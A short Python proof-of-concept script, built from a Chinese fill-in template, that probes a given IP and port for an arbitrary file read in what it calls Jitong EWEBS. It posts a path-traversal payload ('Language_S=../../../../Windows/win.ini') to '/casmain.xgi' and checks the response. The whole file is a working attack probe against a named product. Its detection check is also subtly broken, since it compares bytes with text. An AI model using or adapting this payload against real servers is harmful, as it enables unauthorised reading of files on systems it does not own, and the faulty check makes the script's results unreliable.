#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payload = "/casmain.xgi"                                #填写payload
    header = {"Content-Type": "application/x-www-form-urlencoded"}                                 #填写header头
    data = "Language_S=../../../../../../../Windows/win.ini"                                   #填写data数据
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=3)

        
        if (b'MAPI=' in req.text):              #填写判断条件
            logging.info("[+] {} find Jitong_EWEBS_arbitrary_file_read".format(ip))                          #填写漏洞名
            os._exit(1)

        logging.info("[-] {} do not found Jitong_EWEBS_arbitrary_file_read".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)